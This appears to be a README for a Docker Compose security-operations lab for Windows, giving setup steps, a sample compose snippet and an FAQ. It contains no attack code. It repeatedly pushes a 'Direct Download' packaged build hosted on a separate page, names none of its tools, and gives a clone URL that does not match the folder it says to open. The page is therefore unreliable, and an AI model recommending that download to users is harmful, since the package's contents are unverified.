# advanced soc lab v2.0 - security operations lab 2026

> **Run a full-stack open-source SOC lab on Windows with Docker Compose, built to give blue teams a ready-to-use environment for threat detection, incident response, and adversary emulation in version 2.0.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/logan-young1991/advanced-soc-lab-windows?style=flat-square)](https://github.com/logan-young1991/advanced-soc-lab-windows)

---

<p align="center">
  <a href="https://logan-young1991.github.io/advanced-soc-lab-windows/">
    <img src="https://img.shields.io/badge/Download-advanced%20soc%20lab%20Latest-brightgreen?style=for-the-badge" alt="Download advanced soc lab">
  </a>
</p>

> **[Direct Download - advanced soc lab v2.0](https://logan-young1991.github.io/advanced-soc-lab-windows/)**

---

[Download Latest Build](https://logan-young1991.github.io/advanced-soc-lab-windows/)

---

## Overview

advanced soc lab is a bundled security operations environment centered on Docker Compose and a curated mix of open-source detection and response tooling. It targets Windows users who want a practical lab for SIEM exercises, threat hunting, and blue-team work without having to assemble every service individually.

The stack combines capabilities for log ingestion, network telemetry, alerting, adversary simulation, and investigation workflows. That makes it a good fit for security students, homelab users, and teams that need a reproducible setup for testing detections, refining procedures, and working through MITRE ATT&CK-style scenarios.

---

## What is included

- Full-stack open-source SOC lab in one package
- 12 security tools integrated into a single deployment
- Docker Compose-based setup for repeatable launches
- Threat detection and alerting workflows
- Blue-team training and practice scenarios
- Adversary emulation for control validation
- Log analysis and investigation support
- Incident response and threat hunting use cases

---

## Getting Started

1. Download the repository or clone it locally:
   - `git clone https://github.com/logan-young1991/advanced-soc-lab-windows.git
2. Open the project folder:
   - `cd advanced-soc-lab-v2.0`
3. Review the Docker Compose files and environment settings.
4. Start the lab with Docker Compose:
   - `docker compose up -d`

If you would rather use a packaged release, grab the download link above and follow the launch notes included with it.

---

## Using the lab

Once the stack is up, open the lab services in your browser or through the relevant client tools and begin working with the security stack.

Typical workflow:
1. Bring up the environment with Docker Compose.
2. Ingest or generate logs and network events.
3. Review alerts and detections in the SOC tooling.
4. Run adversary emulation to test coverage.
5. Use investigation tools to support incident response and threat hunting.

Example commands:

- Start services:
  - `docker compose up -d`
- View running containers:
  - `docker compose ps`
- Stop the lab:
  - `docker compose down`

---

## Configuration

Setup is controlled through the Docker Compose files and the related environment variables in the repository. Before the first launch, adjust service ports, storage locations, and any tool-specific settings if your environment calls for custom values.

A typical pattern looks like this:

    services:
      opensearch:
        environment:
          - discovery.type=single-node
      suricata:
        environment:
          - RULE_SET=default

If the project provides separate `.env` files or compose override files, use them to keep local edits separate from the main stack definition.

---

## System requirements

- Windows host platform
- Docker and Docker Compose installed
- Enough CPU, memory, and disk space for multiple security services
- Network access for pulling container images and dependencies
- Browser or client access for web-based tools such as SIEM, log analysis, and response interfaces

Since this is a multi-service lab, resource usage will depend on which tools you enable and how much data you produce.

---

## FAQ

**What is this project for?**  
It is meant for SOC practice, blue-team training, threat detection testing, incident response workflows, and adversary emulation in a controlled lab setting.

**Do I need to install every tool manually?**  
No. The stack is intended to be deployed as a bundled environment through Docker Compose.

**How do I change the lab layout?**  
Edit the compose files and environment settings to match the ports, storage paths, and service options you want.

**What if a service does not start?**  
Inspect the container logs, make sure Docker has enough resources, and confirm that the required ports are free.

**How are updates handled?**  
Use the latest build from the project release or download area, then review any local configuration changes before replacing files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
